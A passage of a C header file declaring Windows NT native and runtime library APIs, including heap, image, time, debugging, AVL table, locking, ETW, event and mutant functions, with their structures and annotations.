    _Inout_	PRTL_OSVERSIONINFOW lpVersionInformation);

NTSYSAPI
VOID
NTAPI
RtlGetNtVersionNumbers(
    _Out_opt_ PULONG MajorVersion,
    _Out_opt_ PULONG MinorVersion,
    _Out_opt_ PULONG BuildNumber);

/************************************************************************************
*
* RTL Error Status API.
*
************************************************************************************/

_When_(Status < 0, _Out_range_(> , 0))
_When_(Status >= 0, _Out_range_(== , 0))
NTSYSAPI
ULONG
NTAPI
RtlNtStatusToDosError(
    _In_ NTSTATUS Status);

NTSYSAPI
VOID
NTAPI
RtlSetLastWin32Error(
    _In_ LONG Win32Error);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetLastNtStatus(
    VOID);

NTSYSAPI
LONG
NTAPI
RtlGetLastWin32Error(
    VOID);

_When_(Status < 0, _Out_range_(> , 0))
_When_(Status >= 0, _Out_range_(== , 0))
NTSYSAPI
ULONG
NTAPI
RtlNtStatusToDosErrorNoTeb(
    _In_ NTSTATUS Status);

NTSYSAPI
VOID
NTAPI
RtlSetLastWin32ErrorAndNtStatusFromNtStatus(
    _In_ NTSTATUS Status);

/************************************************************************************
*
* RTL WOW64 Support API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
RtlWow64EnableFsRedirection(
    _In_ BOOLEAN Wow64FsEnableRedirection);

NTSYSAPI
NTSTATUS
NTAPI
RtlWow64EnableFsRedirectionEx(
    _In_ PVOID DisableFsRedirection,
    _Out_ PVOID *OldFsRedirectionLevel);

NTSYSAPI
NTSTATUS
NTAPI
RtlWow64GetThreadContext(
    _In_ HANDLE ThreadHandle,
    _Inout_ PWOW64_CONTEXT ThreadContext);

NTSYSAPI
NTSTATUS
NTAPI
RtlWow64SetThreadContext(
    _In_ HANDLE ThreadHandle,
    _In_ PWOW64_CONTEXT ThreadContext);

/************************************************************************************
*
* RTL Heap Management API.
*
************************************************************************************/

typedef NTSTATUS(NTAPI * PRTL_HEAP_COMMIT_ROUTINE)(
    _In_  PVOID Base,
    _Inout_ PVOID *CommitAddress,
    _Inout_ PSIZE_T CommitSize
    );

typedef struct _RTL_HEAP_PARAMETERS {
    ULONG Length;
    SIZE_T SegmentReserve;
    SIZE_T SegmentCommit;
    SIZE_T DeCommitFreeBlockThreshold;
    SIZE_T DeCommitTotalFreeThreshold;
    SIZE_T MaximumAllocationSize;
    SIZE_T VirtualMemoryThreshold;
    SIZE_T InitialCommit;
    SIZE_T InitialReserve;
    PRTL_HEAP_COMMIT_ROUTINE CommitRoutine;
    SIZE_T Reserved[2];
} RTL_HEAP_PARAMETERS, *PRTL_HEAP_PARAMETERS;

_Must_inspect_result_
NTSYSAPI
PVOID
NTAPI
RtlCreateHeap(
    _In_ ULONG Flags,
    _In_opt_ PVOID HeapBase,
    _In_ SIZE_T ReserveSize,
    _In_ SIZE_T CommitSize,
    _In_opt_ PVOID Lock,
    _In_opt_ PRTL_HEAP_PARAMETERS Parameters);

NTSYSAPI
PVOID
NTAPI
RtlDestroyHeap(
    _In_ PVOID HeapHandle);

NTSYSAPI
NTSTATUS
NTAPI
RtlSetHeapInformation(
    _In_opt_ PVOID HeapHandle,
    _In_ HEAP_INFORMATION_CLASS HeapInformationClass,
    _In_opt_ PVOID HeapInformation,
    _In_ SIZE_T HeapInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlQueryHeapInformation(
    _In_ PVOID HeapHandle,
    _In_ HEAP_INFORMATION_CLASS HeapInformationClass,
    _Out_opt_ PVOID HeapInformation,
    _In_opt_ SIZE_T HeapInformationLength,
    _Out_opt_ PSIZE_T ReturnLength);

_Must_inspect_result_
NTSYSAPI
PVOID
NTAPI
RtlAllocateHeap(
    _In_ PVOID HeapHandle,
    _In_ ULONG Flags,
    _In_ SIZE_T Size);

NTSYSAPI
BOOLEAN
NTAPI
RtlFreeHeap(
    _In_ PVOID HeapHandle,
    _In_ ULONG Flags,
    _Frees_ptr_opt_ _Post_invalid_ PVOID BaseAddress);

NTSYSAPI
NTSTATUS
NTAPI
RtlZeroHeap(
    _In_ PVOID HeapHandle,
    _In_ ULONG Flags);

NTSYSAPI
SIZE_T
NTAPI
RtlSizeHeap(
    _In_ PVOID HeapHandle,
    _In_ ULONG Flags,
    _In_ PVOID BaseAddress);

NTSYSAPI
VOID
NTAPI
RtlProtectHeap(
    _In_ PVOID HeapHandle,
    _In_ BOOLEAN MakeReadOnly);

NTSYSAPI
PVOID
NTAPI
RtlReAllocateHeap(
    _In_ PVOID HeapHandle,
    _In_ ULONG Flags,
    _Frees_ptr_opt_ PVOID BaseAddress,
    _In_ SIZE_T Size);

NTSYSAPI
ULONG
NTAPI
RtlGetProcessHeaps(
    _In_ ULONG NumberOfHeaps,
    _Out_ PVOID *ProcessHeaps);

typedef NTSTATUS(NTAPI *PRTL_ENUM_HEAPS_ROUTINE)(
    _In_ PVOID HeapHandle,
    _In_ PVOID Parameter
    );

NTSYSAPI
NTSTATUS
NTAPI
RtlEnumProcessHeaps(
    _In_ PRTL_ENUM_HEAPS_ROUTINE EnumRoutine,
    _In_ PVOID Parameter);

/************************************************************************************
*
* RTL Compression API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
RtlGetCompressionWorkSpaceSize(
    _In_ USHORT CompressionFormatAndEngine,
    _Out_ PULONG CompressBufferWorkSpaceSize,
    _Out_ PULONG CompressFragmentWorkSpaceSize);

NTSYSAPI
NTSTATUS
NTAPI
RtlCompressBuffer(
    _In_ USHORT CompressionFormatAndEngine,
    _In_reads_bytes_(UncompressedBufferSize) PUCHAR UncompressedBuffer,
    _In_ ULONG UncompressedBufferSize,
    _Out_writes_bytes_to_(CompressedBufferSize, *FinalCompressedSize) PUCHAR CompressedBuffer,
    _In_ ULONG CompressedBufferSize,
    _In_ ULONG UncompressedChunkSize,
    _Out_ PULONG FinalCompressedSize,
    _In_ PVOID WorkSpace);

NTSYSAPI
NTSTATUS
NTAPI
RtlDecompressBuffer(
    _In_ USHORT CompressionFormat,
    _Out_writes_bytes_to_(UncompressedBufferSize, *FinalUncompressedSize) PUCHAR UncompressedBuffer,
    _In_ ULONG UncompressedBufferSize,
    _In_reads_bytes_(CompressedBufferSize) PUCHAR CompressedBuffer,
    _In_ ULONG CompressedBufferSize,
    _Out_ PULONG FinalUncompressedSize);

NTSYSAPI
NTSTATUS
NTAPI
RtlDecompressBufferEx(
    _In_ USHORT CompressionFormat,
    _Out_writes_bytes_to_(UncompressedBufferSize, *FinalUncompressedSize) PUCHAR UncompressedBuffer,
    _In_ ULONG UncompressedBufferSize,
    _In_reads_bytes_(CompressedBufferSize) PUCHAR CompressedBuffer,
    _In_ ULONG CompressedBufferSize,
    _Out_ PULONG FinalUncompressedSize,
    _In_ PVOID WorkSpace);

/************************************************************************************
*
* RTL Image API.
*
************************************************************************************/

#define RTL_IMAGE_NT_HEADER_EX_FLAG_NO_RANGE_CHECK (0x00000001)

NTSYSAPI
PIMAGE_NT_HEADERS
NTAPI
RtlImageNtHeader(
    _In_ PVOID Base);

NTSYSAPI
NTSTATUS
NTAPI
RtlImageNtHeaderEx(
    _In_ ULONG Flags,
    _In_ PVOID Base,
    _In_ ULONG64 Size,
    _Out_ PIMAGE_NT_HEADERS * OutHeaders);

NTSYSAPI
PVOID
NTAPI
RtlAddressInSectionTable(
    _In_ PIMAGE_NT_HEADERS NtHeaders,
    _In_ PVOID BaseOfImage,
    _In_ ULONG VirtualAddress);

NTSYSAPI
PIMAGE_SECTION_HEADER
NTAPI
RtlSectionTableFromVirtualAddress(
    _In_ PIMAGE_NT_HEADERS NtHeaders,
    _In_ PVOID BaseOfImage,
    _In_ ULONG VirtualAddress);

NTSYSAPI
PVOID
NTAPI
RtlImageDirectoryEntryToData(
    _In_ PVOID BaseOfImage,
    _In_ BOOLEAN MappedAsImage,
    _In_ USHORT DirectoryEntry,
    _Out_ PULONG Size);

NTSYSAPI
PIMAGE_SECTION_HEADER
NTAPI
RtlImageRvaToSection(
    _In_ PIMAGE_NT_HEADERS NtHeaders,
    _In_ PVOID Base,
    _In_ ULONG Rva);

NTSYSAPI
PVOID
NTAPI
RtlImageRvaToVa(
    _In_ PIMAGE_NT_HEADERS NtHeaders,
    _In_ PVOID Base,
    _In_ ULONG Rva,
    _Inout_opt_ PIMAGE_SECTION_HEADER *LastRvaSection);

NTSYSAPI
PVOID
NTAPI
RtlFindExportedRoutineByName(
    _In_ PVOID BaseOfImage,
    _In_ PSTR RoutineName);

NTSYSAPI
NTSTATUS
NTAPI
RtlGuardCheckLongJumpTarget(
    _In_ PVOID PcValue,
    _In_ BOOL IsFastFail,
    _Out_ PBOOL IsLongJumpTarget);

/************************************************************************************
*
* RTL Time API.
*
************************************************************************************/

NTSYSAPI
VOID
NTAPI
RtlSecondsSince1970ToTime(
    _In_ ULONG ElapsedSeconds,
    _Out_ PLARGE_INTEGER Time);

NTSYSAPI
BOOLEAN
NTAPI
RtlTimeToSecondsSince1970(
    _In_ PLARGE_INTEGER Time,
    _Out_ PULONG ElapsedSeconds);


NTSYSAPI
VOID
NTAPI
RtlSecondsSince1980ToTime(
    _In_ ULONG ElapsedSeconds,
    _Out_ PLARGE_INTEGER Time);

NTSYSAPI
BOOLEAN
NTAPI
RtlTimeToSecondsSince1980(
    _In_ PLARGE_INTEGER Time,
    _Out_ PULONG ElapsedSeconds);

NTSYSAPI
VOID
NTAPI
RtlTimeToTimeFields(
    _In_ PLARGE_INTEGER Time,
    _Out_ PTIME_FIELDS TimeFields);

NTSYSAPI
BOOLEAN
NTAPI
RtlTimeFieldsToTime(
    _In_ PTIME_FIELDS TimeFields,
    _Out_ PLARGE_INTEGER Time);

NTSYSAPI
NTSTATUS
NTAPI
RtlSystemTimeToLocalTime(
    _In_ PLARGE_INTEGER SystemTime,
    _Out_ PLARGE_INTEGER LocalTime);

NTSYSAPI
NTSTATUS
NTAPI
RtlLocalTimeToSystemTime(
    _In_ PLARGE_INTEGER LocalTime,
    _Out_ PLARGE_INTEGER SystemTime);

NTSYSAPI
ULONGLONG
NTAPI
RtlGetSystemTimePrecise(
    VOID);

NTSYSAPI
LARGE_INTEGER
NTAPI
RtlGetInterruptTimePrecise(
    _Out_ PLARGE_INTEGER PerformanceCounter);

NTSYSAPI
BOOLEAN
NTAPI
RtlQueryUnbiasedInterruptTime(
    _Out_ PLARGE_INTEGER InterruptTime);

NTSYSAPI
KSYSTEM_TIME
NTAPI
RtlGetSystemTimeAndBias(
    _Out_ KSYSTEM_TIME TimeZoneBias,
    _Out_opt_ PLARGE_INTEGER TimeZoneBiasEffectiveStart,
    _Out_opt_ PLARGE_INTEGER TimeZoneBiasEffectiveEnd);

/************************************************************************************
*
* RTL Debug Support API.
*
************************************************************************************/

NTSYSAPI
ULONG
STDAPIVCALLTYPE
DbgPrint(
    _In_z_ _Printf_format_string_ PCCH Format,
    ...);

NTSYSAPI
ULONG
STDAPIVCALLTYPE
DbgPrintEx(
    _In_ ULONG ComponentId,
    _In_ ULONG Level,
    _In_z_ _Printf_format_string_ PCCH Format,
    ...);

NTSYSAPI
NTSTATUS
NTAPI
DbgQueryDebugFilterState(
    _In_ ULONG ComponentId,
    _In_ ULONG Level);

NTSYSAPI
NTSTATUS
NTAPI
DbgSetDebugFilterState(
    _In_ ULONG ComponentId,
    _In_ ULONG Level,
    _In_ BOOLEAN State);

NTSYSAPI
VOID
NTAPI
DbgUserBreakPoint(
    VOID);

NTSYSAPI
VOID
NTAPI
DbgBreakPoint(
    VOID);

NTSYSAPI
NTSTATUS
NTAPI
DbgUiConnectToDbg(
    VOID);

NTSYSAPI
VOID
NTAPI
DbgUiSetThreadDebugObject(
    _In_ HANDLE DebugObject);

NTSYSAPI
NTSTATUS
NTAPI
DbgUiContinue(
    _In_ PCLIENT_ID AppClientId,
    _In_ NTSTATUS ContinueStatus);

NTSYSAPI
NTSTATUS
NTAPI
DbgUiStopDebugging(
    _In_ HANDLE Process);

NTSYSAPI
NTSTATUS
NTAPI
DbgUiDebugActiveProcess(
    _In_ HANDLE Process);

NTSYSAPI
_Success_(return != 0)
USHORT
NTAPI
RtlCaptureStackBackTrace(
    _In_ ULONG FramesToSkip,
    _In_ ULONG FramesToCapture,
    _Out_writes_to_(FramesToCapture, return) PVOID* BackTrace,
    _Out_opt_ PULONG BackTraceHash);

/************************************************************************************
*
* RTL AVL Tree API.
*
************************************************************************************/

typedef enum _TABLE_SEARCH_RESULT {
    TableEmptyTree,
    TableFoundNode,
    TableInsertAsLeft,
    TableInsertAsRight
} TABLE_SEARCH_RESULT;

typedef enum _RTL_GENERIC_COMPARE_RESULTS {
    GenericLessThan,
    GenericGreaterThan,
    GenericEqual
} RTL_GENERIC_COMPARE_RESULTS;

//
// Add an empty typedef so that functions can reference the
// a pointer to the generic table struct before it is declared.
//

#if defined (__cplusplus)
struct _RTL_AVL_TABLE;
#else
typedef struct _RTL_AVL_TABLE RTL_AVL_TABLE;
typedef struct PRTL_AVL_TABLE *_RTL_AVL_TABLE;
#endif

typedef RTL_GENERIC_COMPARE_RESULTS(NTAPI *PRTL_AVL_COMPARE_ROUTINE)(
    _In_  struct _RTL_AVL_TABLE *Table,
    _In_ PVOID FirstStruct,
    _In_ PVOID SecondStruct
    );

typedef PVOID(NTAPI *PRTL_AVL_ALLOCATE_ROUTINE)(
    _In_ struct _RTL_AVL_TABLE *Table,
    _In_ ULONG ByteSize
    );

typedef VOID(NTAPI *PRTL_AVL_FREE_ROUTINE)(
    _In_  struct _RTL_AVL_TABLE *Table,
    _In_ _Post_invalid_ PVOID Buffer
    );

typedef NTSTATUS(NTAPI *PRTL_AVL_MATCH_FUNCTION)(
    _In_ struct _RTL_AVL_TABLE *Table,
    _In_ PVOID UserData,
    _In_ PVOID MatchData
    );

typedef struct _RTL_BALANCED_LINKS {
    struct _RTL_BALANCED_LINKS *Parent;
    struct _RTL_BALANCED_LINKS *LeftChild;
    struct _RTL_BALANCED_LINKS *RightChild;
    CHAR Balance;
    UCHAR Reserved[3];
} RTL_BALANCED_LINKS, *PRTL_BALANCED_LINKS;

typedef struct _RTL_AVL_TABLE {
    RTL_BALANCED_LINKS BalancedRoot;
    PVOID OrderedPointer;
    ULONG WhichOrderedElement;
    ULONG NumberGenericTableElements;
    ULONG DepthOfTree;
    PRTL_BALANCED_LINKS RestartKey;
    ULONG DeleteCount;
    PRTL_AVL_COMPARE_ROUTINE CompareRoutine;
    PRTL_AVL_ALLOCATE_ROUTINE AllocateRoutine;
    PRTL_AVL_FREE_ROUTINE FreeRoutine;
    PVOID TableContext;
} RTL_AVL_TABLE, *PRTL_AVL_TABLE;

NTSYSAPI
VOID
NTAPI
RtlInitializeGenericTableAvl(
    _Out_ PRTL_AVL_TABLE Table,
    _In_ PRTL_AVL_COMPARE_ROUTINE CompareRoutine,
    _In_ PRTL_AVL_ALLOCATE_ROUTINE AllocateRoutine,
    _In_ PRTL_AVL_FREE_ROUTINE FreeRoutine,
    _In_opt_ PVOID TableContext);

NTSYSAPI
PVOID
NTAPI
RtlInsertElementGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_reads_bytes_(BufferSize) PVOID Buffer,
    _In_ CLONG BufferSize,
    _Out_opt_ PBOOLEAN NewElement);

NTSYSAPI
PVOID
NTAPI
RtlInsertElementGenericTableFullAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_reads_bytes_(BufferSize) PVOID Buffer,
    _In_ CLONG BufferSize,
    _Out_opt_ PBOOLEAN NewElement,
    _In_ PVOID NodeOrParent,
    _In_ TABLE_SEARCH_RESULT SearchResult);

NTSYSAPI
BOOLEAN
NTAPI
RtlDeleteElementGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ PVOID Buffer);

NTSYSAPI
PVOID
NTAPI
RtlLookupElementGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ PVOID Buffer);

NTSYSAPI
PVOID
NTAPI
RtlLookupElementGenericTableFullAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ PVOID Buffer,
    _Out_ PVOID *NodeOrParent,
    _Out_ TABLE_SEARCH_RESULT *SearchResult);

NTSYSAPI
PVOID
NTAPI
RtlEnumerateGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ BOOLEAN Restart);

NTSYSAPI
PVOID
NTAPI
RtlEnumerateGenericTableWithoutSplayingAvl(
    _In_ PRTL_AVL_TABLE Table,
    _Inout_ PVOID *RestartKey);

NTSYSAPI
PVOID
NTAPI
RtlLookupFirstMatchingElementGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ PVOID Buffer,
    _Out_ PVOID *RestartKey);

NTSYSAPI
PVOID
NTAPI
RtlEnumerateGenericTableLikeADirectory(
    _In_ PRTL_AVL_TABLE Table,
    _In_opt_ PRTL_AVL_MATCH_FUNCTION MatchFunction,
    _In_opt_ PVOID MatchData,
    _In_ ULONG NextFlag,
    _Inout_ PVOID *RestartKey,
    _Inout_ PULONG DeleteCount,
    _In_ PVOID Buffer);

NTSYSAPI
PVOID
NTAPI
RtlGetElementGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ ULONG I);

NTSYSAPI
ULONG
NTAPI
RtlNumberGenericTableElementsAvl(
    _In_ PRTL_AVL_TABLE Table);

NTSYSAPI
BOOLEAN
NTAPI
RtlIsGenericTableEmptyAvl(
    _In_ PRTL_AVL_TABLE Table);

/************************************************************************************
*
* RTL Critical Section Support API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
RtlEnterCriticalSection(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

NTSYSAPI
NTSTATUS
NTAPI
RtlLeaveCriticalSection(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

NTSYSAPI
LOGICAL
NTAPI
RtlIsCriticalSectionLocked(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

NTSYSAPI
LOGICAL
NTAPI
RtlIsCriticalSectionLockedByThread(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

NTSYSAPI
ULONG
NTAPI
RtlGetCriticalSectionRecursionCount(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

NTSYSAPI
LOGICAL
NTAPI
RtlTryEnterCriticalSection(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

NTSYSAPI
NTSTATUS
NTAPI
RtlInitializeCriticalSection(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

NTSYSAPI
VOID
NTAPI
RtlEnableEarlyCriticalSectionEventCreation(
    VOID);

NTSYSAPI
NTSTATUS
NTAPI
RtlInitializeCriticalSectionAndSpinCount(
    _In_ PRTL_CRITICAL_SECTION CriticalSection,
    _In_ ULONG SpinCount);

NTSYSAPI
ULONG
NTAPI
RtlSetCriticalSectionSpinCount(
    _In_ PRTL_CRITICAL_SECTION CriticalSection,
    _In_ ULONG SpinCount);

NTSYSAPI
NTSTATUS
NTAPI
RtlDeleteCriticalSection(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

/************************************************************************************
*
* RTL SRW Lock Support API.
*
************************************************************************************/

NTSYSAPI
VOID
NTAPI
RtlInitializeSRWLock(
    _Out_ PRTL_SRWLOCK SRWLock);

NTSYSAPI
VOID
NTAPI
RtlAcquireSRWLockExclusive(
    _Inout_ PRTL_SRWLOCK SRWLock);

NTSYSAPI
VOID
NTAPI
RtlAcquireSRWLockShared(
    _Inout_ PRTL_SRWLOCK SRWLock);

NTSYSAPI
VOID
NTAPI
RtlReleaseSRWLockExclusive(
    _Inout_ PRTL_SRWLOCK SRWLock);

NTSYSAPI
VOID
NTAPI
RtlReleaseSRWLockShared(
    _Inout_ PRTL_SRWLOCK SRWLock);

NTSYSAPI
BOOLEAN
NTAPI
RtlTryAcquireSRWLockExclusive(
    _Inout_ PRTL_SRWLOCK SRWLock);

NTSYSAPI
BOOLEAN
NTAPI
RtlTryAcquireSRWLockShared(
    _Inout_ PRTL_SRWLOCK SRWLock);

NTSYSAPI
VOID
NTAPI
RtlAcquireReleaseSRWLockExclusive(
    _Inout_ PRTL_SRWLOCK SRWLock);

NTSYSAPI
VOID
NTAPI
RtlUpdateClonedSRWLock(
    _Inout_ PRTL_SRWLOCK SRWLock,
    _In_ LOGICAL Shared);

/************************************************************************************
*
* RTL UAC Support API.
*
************************************************************************************/

#define DBG_FLAG_ELEVATION_ENABLED        1
#define DBG_FLAG_VIRTUALIZATION_ENABLED   2
#define DBG_FLAG_INSTALLER_DETECT_ENABLED 3

NTSYSAPI
NTSTATUS
NTAPI
RtlQueryElevationFlags(
    _Inout_ ULONG *ElevationFlags);

/************************************************************************************
*
* RTL Misc Support API.
*
************************************************************************************/

NTSYSAPI
BOOLEAN
NTAPI
RtlDoesFileExists_U(
    _In_ PCWSTR FileName);

NTSYSAPI
ULONG
NTAPI
RtlGetLongestNtPathLength(
    VOID);

NTSYSAPI
BOOLEAN
NTAPI
RtlAreLongPathsEnabled(
    VOID);

/************************************************************************************
*
* RTL Boundary Descriptor API.
*
************************************************************************************/

NTSYSAPI
PVOID
NTAPI
RtlCreateBoundaryDescriptor(
    _In_ PUNICODE_STRING Name,
    _In_ ULONG Flags);

NTSYSAPI
VOID
NTAPI
RtlDeleteBoundaryDescriptor(
    _In_ _Post_invalid_ PVOID BoundaryDescriptor);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddSIDToBoundaryDescriptor(
    _Inout_ PVOID *BoundaryDescriptor,
    _In_ PSID RequiredSid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddIntegrityLabelToBoundaryDescriptor(
    _Inout_ PVOID *BoundaryDescriptor,
    _In_ PSID IntegrityLabel);

/************************************************************************************
*
* RTL work item/async IO.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
RtlQueueWorkItem(
    _In_ WORKERCALLBACKFUNC Function,
    _In_ PVOID Context,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
RtlSetIoCompletionCallback(
    _In_ HANDLE FileHandle,
    _In_ APC_CALLBACK_FUNCTION CompletionProc,
    _In_ ULONG Flags);

/************************************************************************************
*
* RTL data exports.
*
************************************************************************************/

#ifndef _M_X64
#define RtlNtdllName L"ntdll.dll"
#define RtlDosPathSeperatorsString ((UNICODE_STRING)RTL_CONSTANT_STRING(L"\\/"))
#define RtlAlternateDosPathSeperatorString ((UNICODE_STRING)RTL_CONSTANT_STRING(L"/"))
#define RtlNtPathSeperatorString ((UNICODE_STRING)RTL_CONSTANT_STRING(L"\\"))
#else
NTSYSAPI PWSTR RtlNtdllName;
NTSYSAPI UNICODE_STRING RtlDosPathSeperatorsString;
NTSYSAPI UNICODE_STRING RtlAlternateDosPathSeperatorString;
NTSYSAPI UNICODE_STRING RtlNtPathSeperatorString;
#endif

/************************************************************************************
*
* ETW API.
*
************************************************************************************/

typedef VOID(NTAPI *PETWENABLECALLBACK)(
    _In_ LPCGUID SourceId,
    _In_ ULONG IsEnabled,
    _In_ UCHAR Level,
    _In_ ULONGLONG MatchAnyKeyword,
    _In_ ULONGLONG MatchAllKeyword,
    _In_opt_ /*EVENT_FILTER_DESCRIPTOR*/ PVOID FilterData,
    _Inout_opt_ PVOID CallbackContext
    );

NTSYSAPI
NTSTATUS
NTAPI
EtwEventRegister(
    _In_ LPCGUID ProviderId,
    _In_opt_ PETWENABLECALLBACK EnableCallback,
    _In_opt_ PVOID CallbackContext,
    _Out_ PREGHANDLE RegHandle);

NTSYSAPI
ULONG
NTAPI
EtwEventWriteNoRegistration(
    _In_ LPCGUID ProviderId,
    _In_ /*PCEVENT_DESCRIPTOR*/ PVOID EventDescriptor,
    _In_ ULONG UserDataCount,
    _In_reads_opt_(UserDataCount) /*PEVENT_DATA_DESCRIPTOR*/PVOID UserData);


/*
** Runtime Library API END
*/

/*
** Native API START
*/

/************************************************************************************
*
* System Information API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
WINAPI
NtQuerySystemInformation(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtQuerySystemInformationEx(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _In_reads_bytes_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetSystemInformation(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _In_reads_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength);

/************************************************************************************
*
* Event (EventPair) API.
*
************************************************************************************/

typedef enum _EVENT_INFORMATION_CLASS {
    EventBasicInformation
} EVENT_INFORMATION_CLASS;

typedef enum _EVENT_TYPE {
    NotificationEvent,
    SynchronizationEvent
} EVENT_TYPE;

typedef struct _EVENT_BASIC_INFORMATION {
    EVENT_TYPE EventType;
    LONG EventState;
} EVENT_BASIC_INFORMATION, *PEVENT_BASIC_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateEvent(
    _Out_ PHANDLE EventHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ EVENT_TYPE EventType,
    _In_ BOOLEAN InitialState);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenEvent(
    _Out_ PHANDLE EventHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtSetEvent(
    _In_ HANDLE EventHandle,
    _Out_opt_ PLONG PreviousState);

NTSYSAPI
NTSTATUS
NTAPI
NtSetEventEx(
    _In_ HANDLE ThreadId,
    _In_opt_ PRTL_SRWLOCK Lock);

NTSYSAPI
NTSTATUS
NTAPI
NtClearEvent(
    _In_ HANDLE EventHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtResetEvent(
    _In_ HANDLE EventHandle,
    _Out_opt_ PLONG PreviousState);

NTSYSAPI
NTSTATUS
NTAPI
NtPulseEvent(
    _In_ HANDLE EventHandle,
    _Out_opt_ PLONG PreviousState);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenKeyedEvent(
    _Out_ PHANDLE KeyedEventHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryEvent(
    _In_ HANDLE EventHandle,
    _In_ EVENT_INFORMATION_CLASS EventInformationClass,
    _Out_writes_bytes_(EventInformationLength) PVOID EventInformation,
    _In_ ULONG EventInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateEventPair(
    _Out_ PHANDLE EventPairHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenEventPair(
    _Out_ PHANDLE EventPairHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtSetLowEventPair(
    _In_ HANDLE EventPairHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtSetHighEventPair(
    _In_ HANDLE EventPairHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtWaitLowEventPair(
    _In_ HANDLE EventPairHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtWaitHighEventPair(
    _In_ HANDLE EventPairHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtSetLowWaitHighEventPair(
    _In_ HANDLE EventPairHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtSetHighWaitLowEventPair(
    _In_ HANDLE EventPairHandle);

/************************************************************************************
*
* Mutant API.
*
************************************************************************************/

typedef enum _MUTANT_INFORMATION_CLASS {
    MutantBasicInformation,
    MutantOwnerInformation
} MUTANT_INFORMATION_CLASS;

typedef struct _MUTANT_BASIC_INFORMATION {
    LONG CurrentCount;
    BOOLEAN OwnedByCaller;
    BOOLEAN AbandonedState;
} MUTANT_BASIC_INFORMATION, *PMUTANT_BASIC_INFORMATION;

typedef struct _MUTANT_OWNER_INFORMATION {
    CLIENT_ID ClientId;
} MUTANT_OWNER_INFORMATION, *PMUTANT_OWNER_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateMutant(
    _Out_ PHANDLE MutantHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ BOOLEAN InitialOwner);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenMutant(
    _Out_ PHANDLE MutantHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryMutant(
    _In_ HANDLE MutantHandle,
    _In_ MUTANT_INFORMATION_CLASS MutantInformationClass,
    _Out_writes_bytes_(MutantInformationLength) PVOID MutantInformation,
    _In_ ULONG MutantInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtReleaseMutant(
    _In_ HANDLE MutantHandle,
    _Out_opt_ PLONG PreviousCount);

/************************************************************************************
*
* Timer API.
*
************************************************************************************/

typedef VOID(*PTIMER_APC_ROUTINE) (
    _In_ PVOID TimerContext,
    _In_ ULONG TimerLowValue,
    _In_ LONG TimerHighValue
    );

typedef enum _TIMER_TYPE {
    NotificationTimer,
